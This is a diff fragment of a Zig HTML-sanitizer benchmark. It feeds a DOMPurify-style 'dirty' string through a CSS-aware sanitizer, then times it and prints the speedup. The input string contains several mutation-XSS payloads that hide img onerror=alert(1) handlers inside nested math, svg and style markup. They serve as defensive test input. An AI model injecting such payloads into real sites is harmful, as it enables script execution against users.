+        \\<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+        \\
+        \\<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
+        \\
+        \\<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
+        \\
+        \\<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror='alert(1)'>"></style></h1>
+        \\
+        \\<!-- more soon -->
+        \\
+        \\a<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;s>&lt/s>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">
+        \\
+        \\<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">
+        \\
+        \\
+        \\<div><math></math></div>
+        \\
+        \\<b is="foo">bar</b>
+        \\
+        \\<select><template><img src=x onerror=alert(1)></template></select>
+        \\
+        \\<header><h1>Movie website</h1><search><form action="./search/"><label for="movie">Find a Movie</label><input type="search" id="movie" name="q" /><button type="submit">Search</button></form></search></header>
+        \\
+        \\<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><mask id="a" mask-type="alpha"><rect width="100%" height="100%" fill="rgb(10% 10% 10% / 0.4)"></rect><circle cx="50" cy="50" r="35" fill="rgb(90% 90% 90% / 0.6)"></circle></mask><rect width="45" height="45" fill="red" mask="url(#a)"></rect></svg>
+    ;
+    // Note: <image> elements in SVG are blocked (SSRF risk), which is stricter than DOMPurify
+
+    // const allocator = testing.allocator;
+    const doc = try z.parseHTML(allocator, dirty);
+    defer z.destroyDocument(doc);
+    const body = z.bodyNode(doc).?;
+
+    // Initialize CSS sanitizer for <style> tag sanitization
+    var css_sanitizer = try z.CssSanitizer.init(allocator, .{});
+    defer css_sanitizer.deinit();
+
+    // Use custom mode with CSS sanitization enabled
+    const custom_mode = z.SanitizerMode{
+        .custom = z.SanitizerOptions{
+            .skip_comments = true,
+            .remove_scripts = true,
+            .remove_styles = false, // ← Enable CSS sanitization instead of removal
+            .sanitize_inline_styles = true,
+            .strict_uri_validation = true,
+            .allow_custom_elements = false,
+            .allow_framework_attrs = false,
+            .sanitize_dom_clobbering = true,
+        },
+    };
+
+    var timer = try std.time.Timer.start();
+
+    try z.sanitizeWithCss(allocator, body, custom_mode, &css_sanitizer);
+
+    const elapsed_ns = timer.read();
+    const elapsed_us = @as(f64, @floatFromInt(elapsed_ns)) / 1000.0;
+    const elapsed_ms = elapsed_us / 1000.0;
+
+    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
+    defer allocator.free(result);
+
+    std.debug.print("\n=== DOMPurify Benchmark ===\n", .{});
+    std.debug.print("Input size: {} bytes\n", .{dirty.len});
+    std.debug.print("Output size: {} bytes\n", .{result.len});
+    std.debug.print("Sanitization time: {d:.2} µs ({d:.3} ms)\n", .{ elapsed_us, elapsed_ms });
+    std.debug.print("DOMPurify reference: ~11 ms\n", .{});
+    std.debug.print("Speedup: {d:.1}x faster\n", .{11.0 / elapsed_ms});
 }
 
 // fn demoNativeBridge(ctx: ?*z.qjs.JSContext) !void {
